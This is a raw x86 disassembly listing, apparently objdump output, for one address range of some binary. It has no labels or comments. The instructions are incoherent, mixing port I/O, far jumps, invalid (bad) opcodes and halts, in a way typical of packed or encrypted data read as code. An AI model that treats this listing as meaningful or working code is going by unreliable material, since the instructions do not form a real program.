  41cc58:	jno    0x41ccc6
  41cc5a:	mov    ss,WORD PTR [edx-0x61]
  41cc5d:	pop    eax
  41cc5e:	pop    esp
  41cc5f:	lahf   
  41cc60:	sub    al,0x25
  41cc62:	out    0xe,al
  41cc64:	retf   0x7eae
  41cc67:	cwde   
  41cc68:	cmp    esi,DWORD PTR [esi]
  41cc6a:	dec    edx
  41cc6b:	aam    0xe0
  41cc6d:	(bad)  
  41cc6e:	call   0x268a0d8e
  41cc73:	cs dec esp
  41cc75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc76:	push   esp
  41cc77:	and    al,0x82
  41cc79:	xchg   ecx,eax
  41cc7a:	sub    dh,BYTE PTR [esp+ebx*1-0x29777715]
  41cc81:	rcr    ch,1
  41cc83:	push   ss
  41cc84:	sub    edi,DWORD PTR [ebp-0x49]
  41cc87:	inc    edi
  41cc88:	icebp  
  41cc89:	ret    
  41cc8a:	mov    al,ds:0xac55ccb6
  41cc8f:	loope  0x41cca1
  41cc91:	cmp    cl,cl
  41cc93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc94:	cmp    eax,0x21d7713c
  41cc99:	mov    bh,0xae
  41cc9b:	mov    esi,0x6341eb07
  41cca0:	jmp    0x92fa:0xe158d7ef
  41cca7:	push   esi
  41cca8:	pusha  
  41cca9:	rcr    BYTE PTR [esp+ecx*4],cl
  41ccac:	inc    ebp
  41ccad:	cdq    
  41ccae:	jmp    0xf457:0x987da56f
  41ccb5:	push   esp
  41ccb6:	or     dh,BYTE PTR [eax+0x17]
  41ccb9:	mov    ah,0xc4
  41ccbb:	xor    dl,BYTE PTR [ecx]
  41ccbd:	fidivr WORD PTR [ebp+0x10e258c4]
  41ccc3:	lods   eax,DWORD PTR ds:[esi]
  41ccc4:	mov    ah,0x80
  41ccc6:	int3   
  41ccc7:	bound  edi,QWORD PTR [ebx-0x30d2ea85]
  41cccd:	je     0x41cd0e
  41cccf:	or     eax,0x474df25d
  41ccd4:	mov    ds:0x143e601b,al
  41ccd9:	pop    esi
  41ccda:	call   0x4584e61f
  41ccdf:	cdq    
  41cce0:	cmp    eax,0xa7f9de44
  41cce5:	inc    esi
  41cce6:	cmp    eax,0x3b1d2bb5
  41cceb:	mov    eax,ds:0xfda80b56
  41ccf0:	or     dh,BYTE PTR [esi+0x3ce0c7bd]
  41ccf6:	xor    BYTE PTR [edi-0x2f],ah
  41ccf9:	sti    
  41ccfa:	jns    0x41cc8e
  41ccfc:	lods   eax,DWORD PTR ds:[esi]
  41ccfd:	mov    ebp,0x7cae6bc6
  41cd02:	popa   
  41cd03:	pushf  
  41cd04:	adc    eax,0x200462ea
  41cd09:	ret    
  41cd0a:	shr    DWORD PTR [edi-0x5d9be9bd],1
  41cd10:	aad    0x13
  41cd12:	mov    BYTE PTR [esi],cl
  41cd14:	push   0x73
  41cd16:	push   es
  41cd17:	imul   esi,DWORD PTR [ebx+0x1d24038a],0x984ec7fe
  41cd21:	mov    eax,0x3044b4f2
  41cd26:	mov    al,ds:0xc683b3dd
  41cd2c:	out    0x6b,eax
  41cd2e:	es dec ebx
  41cd30:	in     al,dx
  41cd31:	(bad)  
  41cd32:	adc    eax,0x37dacace
  41cd37:	mov    esp,0x249a1cd2
  41cd3c:	pop    ebx
  41cd3d:	and    ebx,ebx
  41cd3f:	cmp    al,0xde
  41cd41:	xchg   BYTE PTR [esi],dl
  41cd43:	adc    ebp,DWORD PTR [ecx]
  41cd45:	ins    BYTE PTR es:[edi],dx
  41cd46:	addr16 ja 0x41cda1
  41cd49:	test   eax,0x38798349
  41cd4e:	sub    ch,0x8a
  41cd51:	push   ecx
  41cd52:	mov    ebp,0xf0d07a09
  41cd57:	or     BYTE PTR cs:[ebx-0x2e7fc6cf],ah
  41cd5e:	cld    
  41cd5f:	push   ss
  41cd60:	push   ds
  41cd61:	or     eax,0xad607dda
  41cd66:	xchg   DWORD PTR [eax-0x5ceb10e2],ebx
  41cd6c:	leave  
  41cd6d:	and    BYTE PTR [ecx-0x21],0x8b
  41cd71:	stc    
  41cd72:	or     dh,BYTE PTR es:[eax-0x24]
  41cd76:	loopne 0x41cd96
  41cd78:	jl     0x41cdda
  41cd7a:	dec    eax
  41cd7b:	test   eax,0x1fb3370d
  41cd80:	stc    
  41cd81:	and    bh,BYTE PTR [esp+ecx*1+0x34b728ac]
  41cd88:	arpl   WORD PTR [edi+0x8],cx
  41cd8b:	push   0xffffffe6
  41cd8d:	mov    bl,0x35
  41cd8f:	cmp    edi,ecx
  41cd91:	in     eax,0xb6
  41cd93:	push   esp
  41cd94:	inc    ecx
  41cd95:	push   0x92429324
  41cd9a:	(bad)  
  41cd9b:	xor    eax,0x93e251f9
  41cda0:	jp     0x41cd8c
  41cda2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cda3:	inc    ebx
  41cda4:	pop    edi
  41cda5:	jns    0x41cdfc
  41cda7:	sahf   
  41cda8:	mov    edx,DWORD PTR [edx+eax*4]
  41cdab:	pop    ebx
  41cdac:	mov    esi,esp
  41cdae:	xchg   esi,eax
  41cdaf:	(bad)
  41cdb4:	retf   0x4909
  41cdb7:	dec    edx
  41cdb8:	mov    ah,0xa6
  41cdba:	call   0x4a1:0x10170381
  41cdc1:	pop    edx
  41cdc2:	pop    edi
  41cdc3:	rcl    DWORD PTR [ecx+eiz*2-0x31ab2665],1
  41cdca:	out    dx,al
  41cdcb:	adc    al,0x8a
  41cdcd:	mov    DWORD PTR [eax+0x70],esp
  41cdd0:	jmp    0x2c2cb035
  41cdd5:	les    esi,FWORD PTR ds:0xe31cb6f1
  41cddb:	or     al,0x43
  41cddd:	aaa    
  41cdde:	jle    0x41cdab
  41cde0:	sub    eax,0x26fd53fc
  41cde5:	jbe    0x41cda1
  41cde7:	push   ecx
  41cde8:	fs jns 0x41cd99
  41cdeb:	pop    edi
  41cdec:	ror    DWORD PTR ds:[esi+0x7e],1
  41cdf0:	pop    ss
  41cdf1:	inc    edx
  41cdf2:	inc    esi
  41cdf3:	mov    ecx,0xd6c0f175
  41cdf8:	pop    ebx
  41cdf9:	or     al,0x8
  41cdfb:	(bad)  
  41cdfc:	or     eax,0x3529b0b5
  41ce01:	jecxz  0x41ce10
  41ce03:	stos   DWORD PTR es:[edi],eax
  41ce04:	dec    eax
  41ce05:	call   0x5a707432
  41ce0a:	in     eax,0x1f
  41ce0c:	ficom  DWORD PTR [edi]
  41ce0e:	jmp    0x46db72a4
  41ce13:	xor    eax,0x140ae3ea
  41ce18:	sub    al,0x9b
  41ce1a:	xor    al,BYTE PTR [ecx]
  41ce1c:	adc    DWORD PTR [eax-0x80],0xda955f80
  41ce23:	mov    edx,0x90e29ef6
  41ce28:	aad    0x77
  41ce2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce2b:	mov    eax,ds:0xe1f798f8
  41ce30:	and    BYTE PTR [ecx],al
  41ce32:	push   eax
  41ce33:	inc    edx
  41ce34:	fcom   st(6)
  41ce36:	jne    0x41ce06
  41ce38:	cmp    DWORD PTR [edx-0x7e],esp
  41ce3b:	inc    esi
  41ce3c:	sti    
  41ce3d:	sbb    DWORD PTR [edx],esp
  41ce3f:	mul    DWORD PTR [esi]
  41ce41:	mov    ebp,0x16c4df24
  41ce46:	stos   BYTE PTR es:[edi],al
  41ce47:	add    DWORD PTR [ebx-0x4c062243],esp
  41ce4d:	neg    BYTE PTR [edi]
  41ce4f:	stc    
  41ce50:	jmp    0x5d3a347b
  41ce55:	add    eax,0x304c3283
  41ce5a:	inc    edx
  41ce5b:	inc    esp
  41ce5c:	mov    ebp,0xf59d7cb5
  41ce61:	cli    
  41ce62:	shl    DWORD PTR [ebp-0xf],0x8b
  41ce66:	mov    esp,DWORD PTR [ecx+edx*2+0x17]
  41ce6a:	repz add ebx,DWORD PTR [esi]
  41ce6d:	bswap  ebx
  41ce6f:	sub    eax,0x7f5fadef
  41ce74:	push   ebp
  41ce75:	sub    al,0x68
  41ce77:	leave  
  41ce78:	sub    esp,DWORD PTR [edx+0x45]
  41ce7b:	xlat   BYTE PTR ds:[ebx]
  41ce7c:	cmp    BYTE PTR ss:[edi],ch
  41ce7f:	pop    ss
  41ce80:	or     BYTE PTR [eax+edx*1+0xa128a69],ch
  41ce87:	push   esi
  41ce88:	retf   
  41ce89:	std    
  41ce8a:	sahf   
  41ce8b:	out    dx,eax
  41ce8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce8d:	add    edi,DWORD PTR [edx]
  41ce8f:	sahf   
  41ce90:	(bad)  
  41ce91:	out    0xae,al
  41ce93:	inc    esp
  41ce94:	repz or cl,BYTE PTR [edi-0x4019e3ff]
  41ce9b:	jmp    0x412b:0x16fb6b9d
  41cea2:	imul   eax,DWORD PTR [edi-0x74],0xffffff82
  41cea6:	inc    edi
  41cea7:	in     eax,dx
  41cea8:	push   ebx
  41cea9:	dec    ecx
  41ceaa:	or     ebx,ecx
  41ceac:	sbb    eax,0xdd54dc62
  41ceb1:	icebp  
  41ceb2:	outs   dx,BYTE PTR ds:[esi]
  41ceb3:	mov    ch,0xac
  41ceb5:	push   edi
  41ceb6:	ja     0x41ce74
  41ceb8:	cvtpi2ps xmm1,QWORD PTR [ebp-0x60a57d50]
  41cebf:	sub    DWORD PTR [esi+eiz*2+0x3082f1d0],eax
  41cec6:	adc    DWORD PTR [esi-0x3a],ebx
  41cec9:	outs   dx,BYTE PTR ds:[esi]
  41ceca:	dec    edi
  41cecb:	and    DWORD PTR [ebx-0x38],edi
  41cece:	mov    dl,0x5a
  41ced0:	repnz mov ds:0x74acaec8,al
  41ced6:	sub    eax,ecx
  41ced8:	fst    DWORD PTR [esi+0x6f]
  41cedb:	(bad)  
  41cedc:	fiadd  WORD PTR ds:0xda77697
  41cee2:	jmp    0x6ab6:0xe1768ce4
  41cee9:	mov    al,ds:0x2c142493
  41ceee:	jle    0x41ceae
  41cef0:	fstp   DWORD PTR [esi]
  41cef2:	lea    ebx,[ebx-0x25]
  41cef5:	ins    BYTE PTR es:[edi],dx
  41cef6:	push   edx
  41cef7:	push   cs
  41cef8:	jb     0x41cf44
  41cefa:	out    dx,eax
  41cefb:	aaa    
  41cefc:	push   eax
  41cefd:	jnp    0x41ceb9
  41ceff:	jmp    0x86ef:0xda967553
  41cf06:	xchg   esp,eax
  41cf07:	cmp    dh,BYTE PTR [eax]
  41cf09:	sub    ebx,DWORD PTR [edi]
  41cf0b:	xor    edi,DWORD PTR fs:[eiz*4+0x1042da7f]
  41cf13:	retf   
  41cf14:	pop    eax
  41cf15:	enter  0x1ea9,0xed
  41cf19:	mov    ecx,0x2f99c056
  41cf1e:	aam    0x2b
  41cf20:	sbb    al,0xac
  41cf22:	sbb    al,0xe3
  41cf24:	(bad)  
  41cf25:	pop    eax
  41cf26:	int    0x56
  41cf28:	inc    edi
  41cf29:	call   0xd49e21
  41cf2e:	push   edi
  41cf2f:	pop    ss
  41cf30:	leave  
  41cf31:	xchg   esi,eax
  41cf32:	mov    al,ds:0xb7263f9c
  41cf37:	mov    ch,0x6b
  41cf39:	bound  esp,QWORD PTR [ebx-0x3aba9fb5]
  41cf3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf40:	add    BYTE PTR [ebp+0x30f23453],0x19
  41cf47:	call   0x9fc9:0xfbe5a5d4
  41cf4e:	inc    ecx
  41cf4f:	mov    eax,0x806249f0
  41cf54:	and    eax,0x53b4a40b
  41cf59:	aad    0xf9
  41cf5b:	hlt    
  41cf5c:	sbb    edi,DWORD PTR [edx]
  41cf5e:	ja     0x41cf3b
  41cf60:	rol    DWORD PTR ds:0x1c5438b2,cl
  41cf66:	add    DWORD PTR [ebx],eax
  41cf68:	fstp   DWORD PTR [edi-0x11d64f9e]
  41cf6e:	push   esp
  41cf6f:	cmp    eax,0xd57cfe01
  41cf74:	and    dh,bh
  41cf76:	stos   DWORD PTR es:[edi],eax
  41cf77:	into   
  41cf78:	outs   dx,DWORD PTR ds:[esi]
  41cf79:	sbb    DWORD PTR [edi-0x3a10b6dc],ebp
  41cf7f:	dec    esi
  41cf80:	or     BYTE PTR [edx],bl
  41cf82:	jb     0x41cf94
  41cf84:	xor    DWORD PTR [edi],ebp
  41cf86:	push   edx
  41cf87:	xchg   edx,eax
  41cf88:	jecxz  0x41cf8b
  41cf8a:	inc    esi
  41cf8b:	cli    
  41cf8c:	into   
  41cf8d:	adc    eax,0x3d752a56
  41cf92:	mov    dh,0x3d
  41cf94:	push   ds
  41cf95:	sar    DWORD PTR [ecx+0x30197c5a],cl
  41cf9b:	add    ebp,ecx
  41cf9d:	jb     0x41cff9
  41cf9f:	inc    ebx
  41cfa0:	test   eax,0x13a3412a
  41cfa5:	sub    DWORD PTR ds:0x8dc25970,edi
  41cfab:	daa    
  41cfac:	sub    al,0x8c
  41cfae:	xchg   esi,eax
  41cfaf:	and    ebx,0xffffffd1
  41cfb2:	push   ebx
  41cfb3:	scas   al,BYTE PTR es:[edi]
  41cfb4:	outs   dx,BYTE PTR ds:[esi]
  41cfb5:	fwait
  41cfb6:	add    DWORD PTR [esi-0x6ca3bf3c],esi
  41cfbc:	pop    esi
  41cfbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfbe:	adc    al,0xf8
  41cfc0:	loope  0x41cf75
  41cfc2:	inc    esi
  41cfc3:	or     al,0x7f
  41cfc5:	loope  0x41d043
  41cfc7:	push   edx
  41cfc8:	pushf  
  41cfc9:	js     0x41cfd4
  41cfcb:	push   cs
  41cfcc:	mov    eax,ds:0x9e7eb038
  41cfd1:	mov    fs,WORD PTR [edi+0x17]
  41cfd4:	cli    
  41cfd5:	mov    ah,0xc2
  41cfd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfd8:	js     0x41d038
  41cfda:	test   al,0x38
  41cfdc:	push   esi
  41cfdd:	mov    ah,0x19
  41cfdf:	in     al,0x6a
  41cfe1:	mov    ebp,0xfe57fe72
  41cfe6:	inc    ebx
  41cfe7:	ins    BYTE PTR es:[edi],dx
  41cfe8:	jbe    0x41d01e
  41cfea:	cmc    
  41cfeb:	out    dx,al
  41cfec:	jmp    0x9cb1:0xb660a21c
  41cff3:	sbb    al,0x9f
  41cff5:	cli    
  41cff6:	repnz out dx,eax
  41cff8:	mov    ebp,0x74c87ee2
  41cffd:	cmp    BYTE PTR [edx],ah
  41cfff:	mov    bl,0xa4
  41d001:	ficom  DWORD PTR [ebx-0x64]
  41d004:	fidivr WORD PTR [esi+0x5ad8b65c]
  41d00a:	fistp  DWORD PTR [edi+ecx*8-0xa78604e]
  41d011:	imul   ecx,DWORD PTR [eax],0x12
  41d014:	test   al,0x1f
  41d016:	jge    0x41cfee
  41d018:	lods   al,BYTE PTR ds:[esi]
  41d019:	add    edi,0x411e4bbe
  41d01f:	stos   BYTE PTR es:[edi],al
  41d020:	xor    dl,BYTE PTR [ebx-0x6d]
  41d023:	or     al,dl
  41d025:	sbb    edx,0xffffffec
  41d028:	pusha  
  41d029:	pop    edx
  41d02a:	or     al,0x20
  41d02c:	and    ebx,DWORD PTR [esi+ecx*2]
  41d02f:	ret    0x1b1f
  41d032:	dec    esp
  41d033:	frstor ds:0xe39c0503
  41d039:	sbb    eax,0xc611301b
  41d03e:	sub    BYTE PTR [ebx+0x21a1b3bc],dl
  41d044:	push   edx
  41d045:	sbb    BYTE PTR [edi+0x52],bh
  41d048:	repz push edx
  41d04a:	or     eax,0xebea07a8
  41d04f:	mov    ds:0x3c802b46,al
  41d054:	pop    ebp
  41d055:	(bad)  
  41d056:	lods   eax,DWORD PTR ds:[esi]
  41d057:	mov    esi,0xdfe6fa5a
  41d05c:	mov    cl,0x44
  41d05e:	fsubr  DWORD PTR ds:0x9879efa7
  41d064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d065:	and    BYTE PTR [esi],dh
  41d067:	jmp    0x77b6:0xf053e8a
  41d06e:	dec    edi
  41d06f:	aad    0x38
  41d071:	xlat   BYTE PTR ds:[ebx]
  41d072:	inc    ebx
  41d073:	push   0x83120bd0
  41d078:	dec    edi
  41d079:	iret   
  41d07a:	xor    DWORD PTR [edi],ebp
  41d07c:	mov    edi,0xdf3ba625
  41d081:	or     ebp,DWORD PTR [edx+0x34]
  41d084:	lods   eax,DWORD PTR ds:[esi]
  41d085:	int    0x8d
  41d087:	jp     0x41d02b
  41d089:	and    eax,0xb97a7e0b
  41d08e:	jmp    0xc10a3b08
  41d093:	mov    esi,0x3b4ab4d3
  41d098:	mov    edx,0x219f6dea
  41d09d:	jp     0x41d052
  41d09f:	xchg   BYTE PTR [edx+ebx*8],ch
  41d0a2:	les    esp,FWORD PTR [ecx+0x5c]
  41d0a5:	jp     0x41d121
  41d0a7:	push   0x49
  41d0a9:	sbb    eax,DWORD PTR [ebx+0x30]
  41d0ac:	imul   eax,DWORD PTR [eax],0xe
  41d0af:	mov    esi,esi
  41d0b1:	xchg   edx,eax
  41d0b2:	xor    al,0x16
  41d0b4:	std    
  41d0b5:	lock sbb dl,dh
  41d0b8:	sub    eax,0xac15caa2
  41d0bd:	push   ds
  41d0be:	cwde   
  41d0bf:	jg     0x41d0be
  41d0c1:	adc    ah,al
  41d0c3:	xchg   esp,eax
  41d0c4:	jo     0x41d0cb
  41d0c6:	ins    BYTE PTR es:[edi],dx
  41d0c7:	aaa    
  41d0c8:	scas   eax,DWORD PTR es:[edi]
  41d0c9:	lds    ebx,FWORD PTR ds:[ecx-0x20]
  41d0cd:	je     0x41d124
  41d0cf:	repnz bound esp,QWORD PTR [eax-0xd]
  41d0d3:	cdq    
  41d0d4:	test   BYTE PTR [esi],bl
  41d0d6:	push   ecx
  41d0d7:	leave  
  41d0d8:	jns    0x41d0d4
  41d0da:	mov    ecx,0x5827be04
  41d0df:	ficom  WORD PTR [eax]
  41d0e1:	gs dec edi
  41d0e3:	push   ebp
  41d0e4:	out    dx,eax
  41d0e5:	repz jmp 0x365b4df1
  41d0eb:	ins    DWORD PTR es:[edi],dx
  41d0ec:	inc    ecx
  41d0ed:	inc    ebx
  41d0ee:	jo     0x41d0b4
  41d0f0:	neg    DWORD PTR [eax]
  41d0f2:	pop    ecx
  41d0f3:	inc    esp
  41d0f4:	push   0xffffffbb
  41d0f6:	inc    esp
  41d0f8:	and    eax,0xd5b65dcc
  41d0fd:	aaa    
  41d0fe:	push   cs
  41d0ff:	and    ecx,ecx
  41d101:	and    al,0x81
  41d103:	add    edx,DWORD PTR [esi+0x1b2b875c]
  41d109:	iret   
  41d10a:	adc    edx,edi
  41d10c:	xor    al,0x12
  41d10e:	bnd call 0xdd25846f
  41d114:	mov    DWORD PTR [ecx],esp
  41d116:	enter  0x97b7,0x61
  41d11a:	loopne 0x41d128
  41d11c:	aas    
  41d11d:	sahf   
  41d11e:	cld    
  41d11f:	jae    0x41d0ad
  41d121:	pop    ds
  41d122:	fsub   st(4),st
  41d124:	adc    ah,BYTE PTR [esi+0x17]
  41d127:	es cdq 
  41d129:	cli    
  41d12a:	push   esi
  41d12b:	inc    esp
  41d12c:	push   eax
  41d12d:	aam    0x42
  41d12f:	shl    BYTE PTR [ebx-0x5b],cl
  41d132:	sub    eax,0xe23f4226
  41d137:	stc    
  41d138:	mov    bl,0x8b
  41d13a:	dec    esp
  41d13b:	test   DWORD PTR [esi],0x3cc808b9
  41d141:	addr16 pop ecx
  41d143:	fdiv   st(4),st
  41d145:	ss out 0x63,al
  41d148:	xchg   esp,eax
  41d149:	hlt    
  41d14a:	push   ecx
  41d14b:	and    al,0x36
  41d14d:	dec    ebx
  41d14e:	xor    BYTE PTR [edx+0x22],bh
  41d151:	popf   
  41d152:	psubusw mm0,QWORD PTR [eax-0x6]
  41d156:	push   esi
  41d157:	test   edx,0x5ce303f4
  41d15d:	and    BYTE PTR ds:0x749257cd,cl
  41d163:	data16 sbb al,0xc0
  41d166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d167:	ins    BYTE PTR es:[edi],dx
  41d168:	std    
  41d169:	pop    ss
  41d16a:	mov    eax,ds:0xc9cde42c
  41d16f:	or     eax,0xf87930a
  41d174:	ret    
  41d175:	pop    esi
  41d176:	add    bl,ah
  41d178:	lods   al,BYTE PTR ds:[esi]
  41d179:	(bad)  [edx-0x4f287aea]
  41d17f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d180:	in     eax,0xb4
  41d182:	inc    ebp
  41d183:	push   esp
  41d184:	repz pop esp
  41d186:	js     0x41d145
  41d188:	mov    ah,0x63
  41d18a:	mov    ebp,0xe307e415
  41d18f:	add    DWORD PTR [ebp-0x58fbf40c],esp
  41d195:	xlat   BYTE PTR ds:[ebx]
  41d196:	cmp    bh,0x58
  41d199:	hlt    
  41d19a:	cmp    ah,BYTE PTR [eax+ecx*8]
  41d19d:	xchg   ebx,eax
  41d19e:	cli    
  41d19f:	or     DWORD PTR [edx],edx
  41d1a1:	jo     0x41d141
  41d1a3:	icebp  
  41d1a4:	and    DWORD PTR [edi+eiz*8-0x76],eax
  41d1a8:	dec    edx
  41d1a9:	inc    eax
  41d1aa:	loope  0x41d13d
  41d1ac:	mov    dl,0xe2
  41d1ae:	sub    al,BYTE PTR [edi-0x58]
  41d1b1:	jmp    0xc408:0x2593887a
  41d1b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1b9:	jecxz  0x41d1d4
  41d1bb:	in     eax,dx
  41d1bc:	xchg   esi,eax
  41d1bd:	sbb    ch,BYTE PTR [esi-0x16a75c1d]
  41d1c3:	pop    ds
  41d1c4:	rcl    BYTE PTR [edx],cl
  41d1c6:	test   DWORD PTR [edi-0x7e],edx
  41d1c9:	sub    al,0xd9
  41d1cb:	dec    ebx
  41d1cc:	(bad)  
  41d1cf:	push   0x25e31498
  41d1d4:	ds enter 0x98b8,0xce
  41d1d9:	and    eax,0x9e179bee
  41d1de:	hlt    
  41d1df:	sub    edi,DWORD PTR [edi]
  41d1e1:	addr16 cmp bh,0x82
  41d1e5:	shl    BYTE PTR [ebp+0x17],1
  41d1e8:	ret    0x4ba6
  41d1eb:	fcom   DWORD PTR [esi+0x6d]
  41d1ee:	lods   al,BYTE PTR ds:[esi]
  41d1ef:	es jmp 0xd11abaf1
  41d1f5:	mov    ds:0x76641f37,al
  41d1fa:	out    dx,eax
  41d1fb:	lahf   
  41d1fc:	push   ss
  41d1fd:	mov    ds:0x9d9c9c1f,al
  41d202:	push   cs
  41d203:	stos   BYTE PTR es:[edi],al
  41d204:	xor    ecx,eax
  41d206:	mov    es,WORD PTR [ebx+eax*1]
  41d209:	ds clc 
  41d20b:	test   esp,ecx
  41d20d:	or     cl,BYTE PTR [esi-0xe]
  41d210:	xchg   esp,eax
  41d211:	inc    ebp
  41d212:	cmp    edx,ebp
  41d214:	aad    0x38
  41d216:	mov    eax,ss:0x40590242
  41d21c:	or     al,0x7a
  41d21e:	xchg   edx,eax
  41d21f:	ror    esi,1
  41d221:	pop    eax
  41d222:	and    BYTE PTR [ebp-0x4d],bl
  41d225:	repz mov bl,0x2f
  41d228:	in     al,0x47
  41d22a:	mov    cs,WORD PTR [ebx]
  41d22c:	pop    ss
  41d22d:	xchg   edx,eax
  41d22e:	push   cs
  41d22f:	mov    eax,ds:0x19bd7eb2
  41d234:	push   ds
  41d235:	mov    eax,ds:0x5af0be5f
  41d23a:	mov    edx,0xdf04d20e
  41d23f:	mov    ch,0x27
  41d241:	cdq    
  41d242:	lock shl DWORD PTR [ecx],0xc9
  41d246:	je     0x41d22e
  41d248:	cdq    
  41d249:	lods   eax,DWORD PTR ds:[esi]
  41d24a:	je     0x41d203
  41d24c:	xchg   esp,eax
  41d24d:	scas   al,BYTE PTR es:[edi]
  41d24e:	ins    BYTE PTR es:[edi],dx
  41d24f:	jle    0x41d255
  41d251:	lea    ecx,[eax-0x7d911489]
  41d257:	ficomp DWORD PTR [esi-0x147b8f99]
  41d25d:	jg     0x41d2cb
  41d25f:	lods   al,BYTE PTR ds:[esi]
  41d260:	push   cs
  41d261:	aaa    
  41d262:	push   es
  41d263:	je     0x41d2b3
  41d265:	outs   dx,BYTE PTR ds:[esi]
  41d266:	and    al,0xed
  41d268:	cli    
  41d269:	ins    DWORD PTR es:[edi],dx
  41d26a:	add    al,0xad
  41d26c:	mov    edi,DWORD PTR [ecx]
  41d26e:	jo     0x41d295
  41d270:	mov    ds:0xf8c77910,al
  41d275:	pop    ds
  41d276:	out    dx,al
  41d277:	and    DWORD PTR [ecx-0x80],ebx
  41d27a:	loope  0x41d20a
  41d27c:	or     dl,BYTE PTR [ecx+eiz*2]
  41d27f:	jns    0x41d2ff
  41d281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d282:	add    BYTE PTR [eax+0x5c],ch
  41d285:	test   eax,0x61ddbcbf
  41d28a:	jle    0x41d257
  41d28c:	pop    edx
  41d28d:	cld    
  41d28e:	pop    esi
  41d28f:	je     0x41d21e
  41d291:	cmp    ebp,esi
  41d293:	jo     0x41d310
  41d295:	in     al,dx
  41d296:	xchg   edx,eax
  41d297:	in     eax,0xfc
  41d299:	sub    al,0x64
  41d29b:	mov    al,0x47
  41d29d:	pop    esp
  41d29e:	or     BYTE PTR [ecx-0x5b],bl
  41d2a1:	sbb    ecx,DWORD PTR [edx-0x3e]
  41d2a4:	sub    esp,DWORD PTR [ecx]
  41d2a6:	dec    edi
  41d2a7:	rcl    BYTE PTR [ebp+0x75],cl
  41d2aa:	or     eax,0xb4709b8b
  41d2af:	dec    ecx
  41d2b0:	inc    eax
  41d2b1:	push   ds
  41d2b2:	repz jg 0x41d2d6
  41d2b5:	cmp    bh,BYTE PTR [ecx-0x42]
  41d2b8:	xlat   BYTE PTR ds:[ebx]
  41d2b9:	sbb    ecx,esp
  41d2bb:	test   dh,0xb8
  41d2be:	or     al,BYTE PTR [eax]
  41d2c0:	jecxz  0x41d2fb
  41d2c2:	sbb    edx,ecx
  41d2c4:	xchg   ebx,eax
  41d2c5:	test   BYTE PTR fs:[edi],ah
  41d2c8:	stos   DWORD PTR es:[edi],eax
  41d2c9:	push   edx
  41d2ca:	xor    edx,DWORD PTR [edx+0x4]
  41d2cd:	int    0xe3
  41d2cf:	or     ch,ch
  41d2d1:	pop    edx
  41d2d2:	bound  esi,QWORD PTR [edx]
  41d2d4:	in     eax,dx
  41d2d5:	xchg   edi,eax
  41d2d6:	in     eax,0x3f
  41d2d8:	inc    esp
  41d2d9:	sub    eax,0xd08b6df
  41d2de:	cmp    BYTE PTR [edx],ch
  41d2e0:	dec    eax
  41d2e1:	push   ebx
  41d2e3:	dec    esi
  41d2e4:	mov    bh,dl
  41d2e6:	pop    ss
  41d2e7:	xor    BYTE PTR ds:0xc7f8c0a7,0xe5
  41d2ee:	jge    0x41d2e2
  41d2f0:	pop    edi
  41d2f1:	pop    ds
  41d2f2:	sbb    eax,0x886f1eec
  41d2f7:	bound  esp,QWORD PTR [ecx-0x6d]
  41d2fa:	(bad)  
  41d2fc:	pop    ebx
  41d2fd:	or     BYTE PTR [edi],cl
  41d2ff:	push   ecx
  41d300:	mov    edi,0x5d5f19cc
  41d305:	jo     0x41d2de
  41d307:	adc    ebx,edi
  41d309:	test   eax,esp
  41d30b:	test   BYTE PTR [ebx],dh
  41d30d:	mov    bh,0xfc
  41d30f:	inc    ecx
  41d310:	(bad)  
  41d312:	jo     0x41d2be
  41d314:	je     0x41d34d
  41d316:	inc    ebx
  41d317:	(bad)  
  41d318:	cmc    
  41d319:	cwde   
  41d31a:	andnps xmm0,XMMWORD PTR [ebx]
  41d31d:	ins    BYTE PTR es:[edi],dx
  41d31e:	mov    ecx,0xa11dd3cf
  41d323:	out    0x46,eax
  41d325:	xor    eax,0x146abc64
  41d32a:	inc    esi
  41d32b:	enter  0xbe66,0xc
  41d32f:	lahf   
  41d330:	sbb    DWORD PTR ds:0xbb25c44f,ebx
  41d336:	push   0x71c063de
  41d33b:	or     edi,DWORD PTR [edi+0x60]
  41d33e:	fistp  QWORD PTR [ecx]
  41d340:	xlat   BYTE PTR ds:[ebx]
  41d341:	dec    ecx
  41d342:	sub    eax,0x39f9f63c
  41d347:	dec    ebp
  41d348:	stos   DWORD PTR es:[edi],eax
  41d349:	xlat   BYTE PTR ds:[ebx]
  41d34a:	icebp  
  41d34b:	call   0xd47ac493
  41d350:	mov    edx,0x3fab073d
  41d355:	xchg   edx,eax
  41d356:	fadd   QWORD PTR [ebp-0x25]
  41d359:	enter  0x262f,0x75
  41d35d:	pop    es
  41d35e:	pop    ebp
  41d35f:	leave  
  41d360:	inc    BYTE PTR [edi+edi*1]
  41d363:	fbld   TBYTE PTR [edi-0x3a]
  41d366:	inc    edx
  41d367:	jbe    0x41d31f
  41d369:	aas    
  41d36a:	lods   eax,DWORD PTR ds:[esi]
  41d36b:	add    BYTE PTR [ecx-0x211c20e3],bh
  41d371:	dec    ebx
  41d372:	je     0x41d34c
  41d374:	ret    
  41d375:	cmp    BYTE PTR [edx+0x6e0c1fd2],ch
  41d37b:	sti    
  41d37c:	gs sti 
  41d37e:	dec    esi
  41d37f:	sub    eax,0x6256dec2
  41d384:	mov    esi,ds
  41d386:	int3   
  41d387:	sahf   
  41d388:	mov    bl,0x8f
  41d38a:	(bad)
  41d38d:	das    
  41d38e:	push   cs
  41d38f:	push   0xffffff8e
  41d391:	in     eax,0xa1
  41d393:	popa   
  41d394:	loopne 0x41d336
  41d396:	jp     0x41d396
  41d398:	jg     0x41d3c8
  41d39a:	jmp    0x7c111eeb
  41d39f:	imul   DWORD PTR [edi+0x701e7302]
  41d3a5:	retf   
  41d3a6:	mov    al,0x8a
  41d3a8:	pushf  
  41d3a9:	int    0x84
